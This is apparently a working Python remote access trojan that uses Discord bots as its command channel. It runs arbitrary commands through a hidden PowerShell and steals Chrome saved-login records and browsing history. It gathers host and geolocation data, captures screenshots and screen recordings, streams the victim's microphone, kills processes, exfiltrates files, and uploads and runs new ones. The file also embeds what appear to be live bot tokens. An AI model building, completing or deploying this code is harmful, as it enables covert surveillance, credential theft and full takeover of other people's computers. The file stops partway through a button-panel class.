#AMERICAN_BETAH
# --- Discord & Async Core ---
import discord
from discord.ext import commands
from discord import FFmpegPCMAudio, opus
import asyncio

# --- System & OS Interaction ---
import os
import sys
import platform
import socket
import subprocess
import psutil
from pathlib import Path

# --- Multimedia & Automation ---
import pyautogui    # For screenshots and screen control
import cv2          # For webcam capture (OpenCV)
import pyttsx3      # For Text-to-Speech
import PIL          # For image processing (Pillow)
from pynput.keyboard import Key, Listener

# --- Networking & Data Scraping ---
import requests     # For IP gathering and API calls
import json         # For data parsing
import webbrowser   # For opening URLs

# --- Database & Filesystem ---
import sqlite3      # For reading Chrome/Browser databases
import shutil       # For copying/moving files
import datetime     # For timestamps in logs

# --- Utilities & Input Monitoring ---
import threading      # Add this line
import pyperclip
import time
from threading import Thread
from pynput import keyboard

# --- Updated FFmpeg & Voice Setup Logic ---
import zipfile
import urllib.request

import numpy as np
from discord.ext import tasks

# ==========================================
# 1. CONFIGURATION (Paste your tokens here)
# ==========================================
TOKENS = {
    "REVOLUTION": "MTQ3NTAyMjM2MzkwODM3ODY5Ng.GtFeN_.vG0N4wW9D_GQkKzw4xsWOnGEHQhvg_11HyY7OU",
    "BACKDOOR": "MTQ3NTAwNzI0NjA1OTcwMDMxNw.GLEiar.rAq8V2JszD2v_ZCIzW29sm343DEkZqX88He0QI",
    "HIGHLEVEL": "MTQ3NDU1MzE0ODA0MjY0NTczNw.GntC2E.xDNLlvF9Yry480C9pALFafA-edhSn5iza79UII"
}
GUILD_ID = 1474541942065991750
PC_NAME = socket.gethostname()

# ==========================================
# 2. BOT INITIALIZATION
# ==========================================
# --- Unified Bot Initialization ---
intents = discord.Intents.all()
rev_bot = commands.Bot(command_prefix="!", intents=intents)
bd_bot = commands.Bot(command_prefix="/", intents=intents)
hl_bot = discord.Client(intents=intents)

# Ensure help commands are removed only once
rev_bot.remove_command("help")
bd_bot.remove_command("help")

shared_cat = None  # The category both bots will use

# --- BACKDOOR BOT CONFIGURATION ---
target_channel_id = None    # Will be #com-backdoor
log_channel_id = None       # Will be #spam
current_dir = os.getcwd()
log_buffer = ""
logging_active = False


# --- SHARED STATE ---
shared_category = None

# ==========================================
# AUTOMATED AUDIO & DEPENDENCY SETUP
# ==========================================
import zipfile
import urllib.request


def ensure_voice_requirements():
    """Checks for FFmpeg and installs required Python audio libraries."""
    os_type = platform.system()
    print(f"📦 Checking audio requirements for {os_type}...")

    # 1. Install Python Packages (PyNaCl is required for the 'Green Circle')
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "PyNaCl", "discord.py[voice]"])
        print("✅ Python voice libraries secured.")
    except Exception as e:
        print(f"⚠️ Pip install failed: {e}")

    # 2. Check/Install FFmpeg
    if shutil.which("ffmpeg"):
        print("✅ FFmpeg already exists in System PATH.")
        return

    if os_type == "Windows":
        ffmpeg_dir = os.path.join(os.getcwd(), "ffmpeg")
        ffmpeg_exe = os.path.join(ffmpeg_dir, "bin", "ffmpeg.exe")

        if not os.path.exists(ffmpeg_exe):
            print("📥 FFmpeg missing. Downloading portable version (this may take a minute)...")
            try:
                url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
                zip_path = "ffmpeg.zip"
                urllib.request.urlretrieve(url, zip_path)

                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall("ffmpeg_temp")

                # Locate the bin folder in the extracted content
                for root, dirs, files in os.walk("ffmpeg_temp"):
                    if "ffmpeg.exe" in files:
                        if os.path.exists(ffmpeg_dir): shutil.rmtree(ffmpeg_dir)
                        shutil.move(root, ffmpeg_dir)  # Moves the 'bin' folder content
                        break

                # Cleanup
                if os.path.exists("ffmpeg_temp"): shutil.rmtree("ffmpeg_temp")
                if os.path.exists(zip_path): os.remove(zip_path)
                print("✨ FFmpeg portable installed to script directory.")
            except Exception as e:
                print(f"❌ Auto-download failed: {e}")

        # Inject portable ffmpeg into the current session's PATH
        if os.path.exists(os.path.dirname(ffmpeg_exe)):
            os.environ["PATH"] += os.pathsep + os.path.dirname(ffmpeg_exe)

    elif os_type == "Darwin":  # macOS
        print("🍎 Attempting Homebrew install...")
        subprocess.run(["brew", "install", "ffmpeg"], check=False)
    elif os_type == "Linux":
        print("🐧 Attempting APT install...")
        subprocess.run(["sudo", "apt", "update", "-y", "&&", "sudo", "apt", "install", "ffmpeg", "-y"], check=False)


# Run this at the very start of your script execution
ensure_voice_requirements()



# ==========================================
# 3. REVOLUTION BOT (!) - The Manager
# ==========================================
# Manually load the Opus library for macOS
if platform.system() == "Darwin":
    # M1/M2/M3 Macs (Apple Silicon) path
    path = '/opt/homebrew/lib/libopus.dylib'
    if not opus.is_loaded():
        try:
            opus.load_opus(path)
        except OSError:
            # Intel Mac path
            opus.load_opus('/usr/local/lib/libopus.dylib')


# --- 2. Chrome Logic Functions ---
def get_chrome_db_path():
    system = platform.system()
    home = os.path.expanduser("~")
    if system == "Windows":
        base_path = os.environ.get('LOCALAPPDATA', os.path.join(home, 'AppData', 'Local'))
        return os.path.join(base_path, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    elif system == "Darwin":  # macOS
        return os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data')
    elif system == "Linux":
        standard_path = os.path.join(home, '.config', 'google-chrome', 'Default', 'Login Data')
        return standard_path if os.path.exists(standard_path) else os.path.join(home, '.config', 'chromium', 'Default',
                                                                                'Login Data')
    return None


def grab_metadata():
    db_path = get_chrome_db_path()
    if not db_path or not os.path.exists(db_path):
        return "❌ Chrome database not found."

    temp_path = "chrome_temp.db"
    shutil.copyfile(db_path, temp_path)

    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()

        results = []
        for url, user, password_blob in rows:
            if user:
                hex_blob = password_blob.hex()[:16] + "..."
                results.append(f"🌐 **URL:** {url}\n👤 **User:** `{user}`\n🔐 **Blob:** `{hex_blob}`")
        return "\n\n".join(results[:10])
    except Exception as e:
        return f"⚠️ Error: {e}"
    finally:
        conn.close()
        if os.path.exists(temp_path): os.remove(temp_path)


ps = subprocess.Popen(
    ["powershell", "-NoProfile", "-NonInteractive", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,  # Line buffered
    creationflags=subprocess.CREATE_NO_WINDOW
)


def execute_command(cmd):
    marker = "__CMD_DONE__"

    # We use semicolons instead of newlines to keep the input 'flat'
    # and add ErrorActionPreference to ensure catch blocks actually trigger.
    wrapped = (
        f'$ErrorActionPreference = "Stop"; '
        f'try {{ {cmd} }} catch {{ Write-Output $_.Exception.Message }}; '
        f'Write-Output "{marker}"'
    )

    # Send the command
    ps.stdin.write(wrapped + "\n")
    ps.stdin.flush()

    output = []

    # Read stdout until the marker is found
    while True:
        line = ps.stdout.readline()
        if not line:
            break

        clean_line = line.strip()

        # Check if we hit our marker
        if marker in clean_line:
            break

        # Ignore empty lines or the echoed command if it still leaks through
        if clean_line and not clean_line.startswith("PS "):
            output.append(clean_line)

    return "\n".join(output)


@rev_bot.command()
async def shell(ctx, *, command_input: str):
    """Executes a function based on specific input."""

    # 1. Standard check to ignore bots
    if ctx.author.bot:
        return

    # 2. Call your execution logic
    # We use command_input because the '*' in the arguments captures everything after the command name
    result = execute_command(command_input) or f"Executed '{command_input}' with no output."

    # 3. Handle the 2000 character limit (Pagination)
    while len(result) > 0:
        await ctx.send(result[:2000])
        result = result[2000:]


# --- 3. Commands ---
@rev_bot.command()
async def grab(ctx):
    await ctx.send("🔍 Scanning system for browser metadata...")
    report = grab_metadata()
    if len(report) > 2000: report = report[:1900] + "... [Truncated]"
    await ctx.send(report)


# --- 4. System Audit Logic ---
def get_super_metadata():
    system = platform.system()
    # Basic Info
    info = {
        "Hostname": socket.gethostname(),
        "OS": f"{system} {platform.release()} (Build: {platform.version()})",
        "Architecture": platform.machine(),
        "Python Version": platform.python_version(),
        "Uptime": str(datetime.timedelta(seconds=int(psutil.boot_time()))),
    }

    # --- NETWORK (Public & Local) ---
    try:
        geo = requests.get('http://ip-api.com/json/', timeout=10).json()
        if geo.get("status") == "success":
            info["🌍 Public IP"] = geo.get("query")
            info["📍 Location"] = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
            info["🏢 ISP"] = geo.get("isp")
            info["🌐 Org"] = geo.get("org")

        # Get Local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["🏠 Local IP"] = s.getsockname()[0]
        s.close()
    except:
        pass

    # --- HARDWARE RESOURCES ---
    info["CPU Cores"] = f"{psutil.cpu_count(logical=False)} Physical / {psutil.cpu_count(logical=True)} Logical"
    info["RAM Total"] = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"

    # Disk Info (Main Drive)
    disk = psutil.disk_usage('/')
    info["Disk Space"] = f"{round(disk.free / (1024 ** 3), 2)}GB Free / {round(disk.total / (1024 ** 3), 2)}GB Total"

    # Battery (If laptop)
    battery = psutil.sensors_battery()
    if battery:
        info["🔋 Battery"] = f"{battery.percent}% {'(Charging)' if battery.power_plugged else '(Discharging)'}"

    # --- DEEP SYSTEM INFO (OS Dependent) ---
    try:
        if system == "Windows":
            def run_wmic(item):
                return subprocess.check_output(f"wmic {item} get /value", shell=True).decode().strip().split("=")[1]

            info["Manufacturer"] = run_wmic("computersystem")
            info["Product ID"] = run_wmic("os")
        elif system == "Darwin":  # macOS
            def run_mac(cmd):
                return subprocess.check_output(cmd).decode().strip()

            info["Model"] = run_mac(['sysctl', '-n', 'hw.model'])
            info["Processor"] = run_mac(['sysctl', '-n', 'machdep.cpu.brand_string'])
            # Attempt to get Serial Number
            serial_cmd = "system_profiler SPHardwareDataType | awk '/Serial Number/ {print $4}'"
            info["Serial Number"] = subprocess.check_output(serial_cmd, shell=True).decode().strip()
    except:
        pass

    return info


def get_chrome_file(filename):
    system = platform.system()
    home = os.path.expanduser("~")
    if system == "Windows":
        base = os.environ.get('LOCALAPPDATA', '')
        return os.path.join(base, 'Google/Chrome/User Data/Default', filename)
    elif system == "Darwin":  # macOS
        return os.path.join(home, 'Library/Application Support/Google/Chrome/Default', filename)
    return None


shared_category = None  # Global variable so all bots can see it


@rev_bot.event
async def on_ready():
    global shared_category
    print(f"✅ Manager Online: {rev_bot.user}")

    guild = rev_bot.get_guild(GUILD_ID)
    if not guild: return

    # 1. Ensure Category exists
    category_name = PC_NAME
    from discord.utils import get
    category = get(guild.categories, name=category_name)
    if category is None:
        category = await guild.create_category(category_name)
    shared_category = category

    # 2. Create Text Channels and populate #info
    channel_list = ["info", "main", "spam", "recordings", "file-related"]
    for name in channel_list:
        ch = get(category.text_channels, name=name)
        if not ch:
            ch = await guild.create_text_channel(name, category=category)

        # POPULATE INFO CHANNEL
        if name == "info":
            data = get_super_metadata()
            embed = discord.Embed(title=f"💻 System Audit: {PC_NAME}", color=0x2b2d31)
            for k, v in data.items():
                embed.add_field(name=k, value=f"`{v}`", inline=True)
            await ch.send(embed=embed)

    # 3. Create Voice Channel
    if not get(category.voice_channels, name="live-microphone"):
        await guild.create_voice_channel("live-microphone", category=category)

    print("✨ CONNECTIONS structure and Info Log complete.")


# --- PASTE REVOLUTION (!) COMMANDS BELOW ---
@rev_bot.command()
async def history(ctx):
    """Grabs up to 1000 history entries and sends as a .txt file"""
    path = get_chrome_file("History")
    if not path or not os.path.exists(path): return await ctx.send("❌ History not found.")

    await ctx.send("🕵️‍♂️ Scraping deep history... this might take a second.")
    shutil.copyfile(path, "temp_h.db")

    try:
        conn = sqlite3.connect("temp_h.db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cursor.fetchall()

        with open("history.txt", "w", encoding="utf-8") as f:
            f.write(f"CHROME HISTORY EXPORT - {datetime.datetime.now()}\n")
            f.write("=" * 50 + "\n\n")
            for url, title, count in rows:
                f.write(f"TITLE: {title}\nURL: {url}\nVISITS: {count}\n\n" + "-" * 20 + "\n")

        await ctx.send("✅ Full history log attached:", file=discord.File("history.txt"))
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")
    finally:
        conn.close()
        if os.path.exists("temp_h.db"): os.remove("temp_h.db")
        if os.path.exists("history.txt"): os.remove("history.txt")








@rev_bot.command()
async def ss(ctx):
    """Captures the screen and sends it as a .png file."""
    try:
        await ctx.send("📸 Taking screenshot...")

        # Define the filename
        ss_path = "capture.png"

        # Take the screenshot
        # On Mac, Pillow handles the high-res conversion automatically
        pic = pyautogui.screenshot()
        pic.save(ss_path)

        # Send to Discord
        await ctx.send(file=discord.File(ss_path))

        # Cleanup
        if os.path.exists(ss_path):
            os.remove(ss_path)

    except Exception as e:
        await ctx.send(f"❌ Screenshot Failed: {e}")


def get_universal_mic_args():
    os_type = platform.system()

    if os_type == "Windows":
        # Windows: Uses DirectShow
        return "-f dshow -i audio=Microphone"

    elif os_type == "Darwin":
        # Mac: Uses AVFoundation. ":0" is usually the default system mic.
        return "-f avfoundation -i :0"

    elif os_type == "Linux":
        # Linux: Uses ALSA default capture
        return "-f alsa -i default"

    return None



rev_intents = discord.Intents.default()
rev_intents.message_content = True
rev_intents.voice_states = True  # FIX: Crucial for the bot to see you in VC
rev_intents.members = True


@rev_bot.command()
async def join(ctx):
    if not ctx.author.voice:
        return await ctx.send("❌ Join a voice channel first.")

    ffmpeg_dir = os.path.join(os.getcwd(), "ffmpeg", "bin")
    if os.path.exists(ffmpeg_dir) and ffmpeg_dir not in os.environ["PATH"]:
        os.environ["PATH"] += os.pathsep + ffmpeg_dir

    channel = ctx.author.voice.channel

    # 1. Force UTF-8 and extract the exact name from the AUDIO section
    mic_source = None
    try:
        # Use chcp 65001 to ensure special characters aren't mangled in the output buffer
        cmd = 'chcp 65001 > nul && ffmpeg -list_devices true -f dshow -i dummy'
        proc = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, text=True, creationflags=0x08000000)
        output = proc.stderr

        import re
        # Isolate the audio section to avoid matching video-only pins
        if "DirectShow audio devices" in output:
            audio_section = output.split("DirectShow audio devices")[1].split("DirectShow video devices")[0]
            # Grab the first name inside quotes from the audio section
            match = re.search(r'"([^"]+)"', audio_section)
            if match:
                mic_source = f"audio={match.group(1)}"
    except Exception as e:
        print(f"Discovery error: {e}")

    # Fallback if discovery fails (ensure the string is formatted correctly)
    if not mic_source:
        mic_source = "audio=Microphone (Microsoft® LifeCam Cinema(TM))"

    try:
        vc = ctx.voice_client or await channel.connect()
        if vc.is_playing(): vc.stop()

        ffmpeg_path = shutil.which("ffmpeg") or os.path.join(ffmpeg_dir, "ffmpeg.exe")

        # 2. Critical Flags:
        # -vn: (Video None) stops FFmpeg from trying to open the webcam's video pin
        # -rtbufsize: Prevents I/O errors from buffer overflows during real-time capture
        source = discord.FFmpegPCMAudio(
            executable=ffmpeg_path,
            source=mic_source,
            before_options="-f dshow -rtbufsize 150M",
            options="-vn -sn -af volume=3.0"
        )

        vc.play(source)
        await ctx.send(f"🎙️ **Connected!** Using device: `{mic_source}`")

    except Exception as e:
        await ctx.send(f"⚠️ **Join Error:** {e}\nTry manual join with: `!mjoin Name`")

#task_mapping = {}

@rev_bot.command()
async def list_mics(ctx):
    ffmpeg_dir = os.path.join(os.getcwd(), "ffmpeg", "bin")
    if os.path.exists(ffmpeg_dir) and ffmpeg_dir not in os.environ["PATH"]:
        os.environ["PATH"] += os.pathsep + ffmpeg_dir

    try:
        cmd = 'ffmpeg -list_devices true -f dshow -i dummy'
        proc = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        output = proc.stderr

        # If the specific section isn't found, just send the raw text
        if "DirectShow audio devices" not in output:
            await ctx.send("⚠️ Could not find standard audio section. Raw Output:")
            return await ctx.send(f"```\n{output[:1900]}\n```")

        import re
        audio_section = output.split("DirectShow audio devices")[1].split("DirectShow video devices")[0]
        devices = re.findall(r'\"([^\"]+)\"', audio_section)

        if devices:
            msg = "**Available Microphones:**\n" + "\n".join([f"- `{d}`" for d in devices])
            await ctx.send(msg)
        else:
            await ctx.send("❌ Audio section found, but it was empty.")
    except Exception as e:
        await ctx.send(f"Critical Error: {e}")


@rev_bot.command()
async def mjoin(ctx, *, device_name: str):
    """Manually join using a specific device name"""
    if not ctx.author.voice:
        return await ctx.send("❌ Join a VC first.")

    ffmpeg_path = shutil.which("ffmpeg") or os.path.join(os.getcwd(), "ffmpeg", "bin", "ffmpeg.exe")
    channel = ctx.author.voice.channel

    try:
        vc = ctx.voice_client or await channel.connect()
        if vc.is_playing(): vc.stop()

        # We wrap the device name in audio="..."
        source = discord.FFmpegPCMAudio(
            executable=ffmpeg_path,
            source=f"audio={device_name}",
            before_options="-f dshow",
            options="-af volume=3.0"
        )

        vc.play(source)
        await ctx.send(f"🎙️ **Attempting Manual Join:** `{device_name}`")
    except Exception as e:
        await ctx.send(f"⚠️ **Manual Join Failed:** {e}")


@rev_bot.command()
async def leave(ctx):
    """Disconnects the bot from the voice channel."""
    if ctx.voice_client: # Check if the bot is in a VC
        await ctx.voice_client.disconnect()
        await ctx.send("🔌 **Disconnected** from the voice channel.")
    else:
        await ctx.send("❌ I'm not currently in a voice channel.")

@rev_bot.command()
async def task(ctx):
    """Lists the top 20 processes by name, compatible with Windows, Mac, and Linux."""
    global task_mapping
    task_mapping = {}

    processes = []
    # Using 'status' helps filter out processes that are already shutting down
    for proc in psutil.process_iter(['name', 'pid', 'memory_percent', 'status']):
        try:
            info = proc.info
            # Handle cases where memory usage is hidden by the OS
            if info['memory_percent'] is None:
                info['memory_percent'] = 0.0
            processes.append(info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    # Sort by memory usage so the most relevant apps (Chrome, Discord, etc.) appear first
    processes = sorted(processes, key=lambda x: x['memory_percent'], reverse=True)[:20]

    if not processes:
        return await ctx.send("❌ No accessible processes found. The bot may need higher permissions.")

    # Detect the OS for the header
    current_os = platform.system()
    response = f"📋 **Active Tasks ({current_os}):**\n```\n"

    for i, proc in enumerate(processes, 1):
        task_mapping[i] = proc['pid']
        # Truncate long names to keep the list clean
        clean_name = proc['name'][:25]
        response += f"{i:2}. {clean_name}\n"

    response += "```\nType `!end <number>` to close one."

    # Discord limit is 2000 chars; this simple list will always stay well under that
    await ctx.send(response)

@rev_bot.command()
async def end(ctx, index: int):
    """Ends a task universally by PID."""
    global task_mapping

    if index not in task_mapping:
        await ctx.send("❌ Invalid number. Please run `!task` first.")
        return

    pid = task_mapping[index]
    try:
        process = psutil.Process(pid)
        p_name = process.name()

        # .terminate() is the universal 'polite' kill (SIGTERM on Unix, TerminateProcess on Win)
        process.terminate()

        await ctx.send(f"✅ Sent termination signal to **{p_name}** (PID: {pid}).")
    except psutil.NoSuchProcess:
        await ctx.send("⚠️ Process already closed.")
    except psutil.AccessDenied:
        await ctx.send(f"🚫 **Access Denied**: The OS blocked the request to kill `{p_name}`. Run the bot as Admin/Sudo.")
    except Exception as e:
        await ctx.send(f"❌ Unexpected Error: {e}")


recording_active = False


# 1. Add this helper function to handle the "Heavy Lifting" (FFmpeg + Upload)
async def process_and_upload(temp_file, final_file, timestamp, ctx):
    try:
        ffmpeg_path = shutil.which("ffmpeg") or os.path.join(os.getcwd(), "ffmpeg", "bin", "ffmpeg.exe")

        # Convert to H.264 (Mobile friendly)
        conversion_cmd = [
            ffmpeg_path, '-y', '-i', temp_file,
            '-c:v', 'libx264', '-pix_fmt', 'yuv420p',
            '-movflags', 'faststart', '-crf', '28', '-preset', 'ultrafast', final_file
        ]

        # Run conversion
        proc = await asyncio.create_subprocess_exec(
            *conversion_cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
        )
        await proc.wait()

        # Find channel and send
        rec_channel = discord.utils.get(ctx.guild.text_channels, name="recordings")
        if rec_channel and os.path.exists(final_file):
            await rec_channel.send(f"📱 **Streamable Clip:** `{timestamp}`", file=discord.File(final_file))

        # Cleanup
        for f in [temp_file, final_file]:
            if os.path.exists(f): os.remove(f)
    except Exception as e:
        print(f"Upload Error: {e}")


# 2. The Recording Function (Optimized)
async def recording_manager(ctx):
    global recording_active
    while recording_active:
        timestamp = datetime.datetime.now().strftime("%H-%M-%S")
        temp_file = f"temp_{timestamp}.mp4"
        final_file = f"rec_{timestamp}.mp4"

        try:
            screen_size = pyautogui.size()
            width, height = int(screen_size.width / 2), int(screen_size.height / 2)
            if width % 2 != 0: width -= 1
            if height % 2 != 0: height -= 1

            fps = 4.0
            total_frames = int(fps * 120)  # 120 seconds
            out = cv2.VideoWriter(temp_file, cv2.VideoWriter_fourcc(*'mp4v'), fps, (width, height))

            for _ in range(total_frames):
                if not recording_active: break
                img = pyautogui.screenshot()
                frame = cv2.resize(np.array(img), (width, height))
                out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
                await asyncio.sleep(0.25)  # 1 / 4fps

            out.release()

            # This is the key: Start upload in background and IMMEDIATELY loop back to start next rec
            asyncio.create_task(process_and_upload(temp_file, final_file, timestamp, ctx))

        except Exception as e:
            print(f"Recording Error: {e}")
            await asyncio.sleep(5)


# 3. Updated Commands
@rev_bot.command()
async def start_rec(ctx):
    global recording_active
    if recording_active:
        return await ctx.send("⚠️ Already recording.")
    recording_active = True
    # Start the manager as a background task
    rev_bot.loop.create_task(recording_manager(ctx))
    await ctx.send("🛰️ **Started.** Clips will arrive every 2 minutes automatically.")


@rev_bot.command()
async def stop_rec(ctx):
    global recording_active
    recording_active = False
    await ctx.send("🛑 **Stopped.** Finalizing last clip...")



# Initialize a global variable for the current path
current_dir = os.getcwd()





@rev_bot.command()
async def cd(ctx, *, path: str):
    """Changes directory. Supports '..', absolute paths, and relative paths."""
    global current_dir
    try:
        # Resolve '..' and relative paths automatically
        new_path = os.path.normpath(os.path.join(current_dir, path))

        if os.path.exists(new_path) and os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"📂 Switched to: `{current_dir}`")
        else:
            await ctx.send(f"❌ Directory not found: `{path}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")


@rev_bot.command()
async def pwd(ctx):
    """Shows the current directory the bot is looking at."""
    global current_dir
    await ctx.send(f"📍 Current Location: `{current_dir}`")


# Update your !ls command to use this global 'current_dir'

# Ensure this is at the top of your script


@rev_bot.command()
async def ls(ctx, *, path: str = None):
    """Lists files in the current_dir or a specific path."""
    global current_dir

    # 1. Resolve the target path dynamically
    try:
        if path:
            # If a path is provided, join it with our current location and normalize it
            target = os.path.abspath(os.path.join(current_dir, path))
        else:
            # Otherwise, just use the current tracking directory
            target = current_dir

        # 2. Safety Checks
        if not os.path.exists(target):
            return await ctx.send(f"❌ Path not found: `{target}`")
        if not os.path.isdir(target):
            return await ctx.send(f"📄 `{os.path.basename(target)}` is a file, not a directory.")

        # 3. Get and Sort Contents
        items = os.listdir(target)
        items.sort(key=lambda x: x.lower())  # Alphabetical sort

        folders = []
        files = []
        for item in items:
            # Check if each item is a directory or a file
            if os.path.isdir(os.path.join(target, item)):
                folders.append(f"📁 {item}/")
            else:
                files.append(f"📄 {item}")

        # 4. Format the Message
        all_items = folders + files
        header = f"📂 **Location:** `{target}`\n"

        if not all_items:
            return await ctx.send(header + "*(Directory is empty)*")

        # Create a clean list (Discord has a 2000 character limit)
        # We take the first 40 items to ensure the message fits
        body = "\n".join(all_items[:40])
        response = f"{header}```\n{body}\n```"

        if len(all_items) > 40:
            response += f"\n*...and {len(all_items) - 40} more items.*"

        await ctx.send(response)

    except PermissionError:
        await ctx.send("🚫 **Access Denied**: I don't have permission to view this folder.")
    except Exception as e:
        await ctx.send(f"⚠️ **Error**: {e}")


@rev_bot.command()
async def download(ctx, *, filename: str):
    """Sends a specific file from the current directory to Discord."""
    global current_dir
    file_path = os.path.abspath(os.path.join(current_dir, filename))

    if not os.path.exists(file_path):
        return await ctx.send(f"❌ Error: `{filename}` not found in this directory.")

    if os.path.isdir(file_path):
        return await ctx.send("❌ Error: That is a folder. You can only download files.")

    # Check file size (Discord has an 8MB limit for free accounts, 25MB+ for boosted)
    file_size = os.path.getsize(file_path) / (1024 * 1024)  # Size in MB

    if file_size > 25:
        return await ctx.send(f"⚠️ File is too large ({file_size:.2f}MB). Discord's limit is usually 25MB.")

    await ctx.send(f"📤 Uploading `{filename}`...")
    try:
        await ctx.send(file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f"❌ Failed to send file: {e}")




@rev_bot.command()
async def upload(ctx, mode: str = "single"):
    """
    Waits for a file upload and saves it to the current bot directory (!cd).
    Usage: !upload single OR !upload multiple
    """
    global current_dir  # Uses the path we've been navigating with !cd

    mode = mode.lower()
    if mode not in ["single", "multiple"]:
        return await ctx.send("❌ Usage: `!upload single` or `!upload multiple`")

    await ctx.send(f"📥 **Target Directory:** `{current_dir}`\nDrop the file(s) now. I'm waiting...")

    def check(m):
        # Must be the same user, same channel, and have an attachment
        return m.author == ctx.author and m.channel == ctx.channel and len(m.attachments) > 0

    try:
        # Wait up to 60 seconds for the user to upload
        msg = await rev_bot.wait_for('message', check=check, timeout=60.0)

        saved_files = []
        for attachment in msg.attachments:
            # Join our tracked current_dir with the name of the uploaded file
            file_path = os.path.join(current_dir, attachment.filename)

            # Save the file to the host machine
            await attachment.save(file_path)
            saved_files.append(attachment.filename)

            if mode == "single":
                break

        file_list = ", ".join(saved_files)
        await ctx.send(f"✅ Successfully saved to `{current_dir}`:\n`{file_list}`")

    except asyncio.TimeoutError:
        await ctx.send("⏰ **Upload timed out.** Please run the command again when ready.")
    except PermissionError:
        await ctx.send(f"🚫 **Permission Denied**: I don't have rights to write in `{current_dir}`.")
    except Exception as e:
        await ctx.send(f"⚠️ **Error**: {e}")





@rev_bot.command()
async def execute(ctx, *, filename: str):
    """Opens or runs a file in the current working directory."""
    global current_dir
    # Construct the full path
    file_path = os.path.join(current_dir, filename)

    # 1. Check if the file actually exists
    if not os.path.exists(file_path):
        return await ctx.send(f"❌ Error: `{filename}` not found in current directory.")

    if os.path.isdir(file_path):
        return await ctx.send(f"📁 `{filename}` is a folder. Use `!cd` to enter it.")

    await ctx.send(f"🚀 Attempting to execute `{filename}`...")

    try:
        system = platform.system()

        if system == "Windows":
            # Windows native way to 'run' a file
            os.startfile(file_path)
        elif system == "Darwin":
            # macOS native way (opens apps, docs, scripts)
            subprocess.call(['open', file_path])
        else:
            # Linux (works for most desktop distros)
            subprocess.call(['xdg-open', file_path])

        await ctx.send(f"✅ Successfully triggered `{filename}`.")

    except Exception as e:
        await ctx.send(f"❌ Execution failed: {e}")


class ControlPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    # --- ROW 1: DATA & SYSTEM ---
    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.green, row=0)
    async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await interaction.response.defer()
        await ctx.invoke(rev_bot.get_command('ss'))

    @discord.ui.button(label="🕵️ Grab Chrome", style=discord.ButtonStyle.danger, row=0)
    async def grab_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await interaction.response.defer()
        await ctx.invoke(rev_bot.get_command('grab'))

    @discord.ui.button(label="📋 Task List", style=discord.ButtonStyle.blurple, row=0)
    async def task_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await interaction.response.defer()
        await ctx.invoke(rev_bot.get_command('task'))

    @discord.ui.button(label="🛑 End Task", style=discord.ButtonStyle.secondary, row=0)
    async def end_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("To end a task, type: `!end <number>`", ephemeral=True)

    # --- ROW 2: FILE MANAGEMENT ---
    @discord.ui.button(label="📂 List (ls)", style=discord.ButtonStyle.gray, row=1)
    async def ls_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await interaction.response.defer()
        await ctx.invoke(rev_bot.get_command('ls'))

    @discord.ui.button(label="📍 PWD", style=discord.ButtonStyle.gray, row=1)
    async def pwd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await ctx.invoke(rev_bot.get_command('pwd'))

    @discord.ui.button(label="📁 Change Dir", style=discord.ButtonStyle.gray, row=1)
    async def cd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("To move, type: `!cd <folder>` or `!cd ..`", ephemeral=True)

    @discord.ui.button(label="🚀 Execute", style=discord.ButtonStyle.primary, row=1)
    async def exec_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("To run a file, type: `!execute <filename>`", ephemeral=True)

    # --- ROW 3: TRANSFER & MEDIA ---
    @discord.ui.button(label="📤 Upload", style=discord.ButtonStyle.success, row=2)
    async def upload_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Type `!upload single` or `!upload multiple` then drop files.",
                                                ephemeral=True)

    @discord.ui.button(label="📥 Download", style=discord.ButtonStyle.success, row=2)
    async def dl_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("To download, type: `!download <filename>`", ephemeral=True)

    @discord.ui.button(label="🎙️ Join Mic", style=discord.ButtonStyle.primary, row=2)
    async def join_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctx = await rev_bot.get_context(interaction.message)
        await interaction.response.defer()
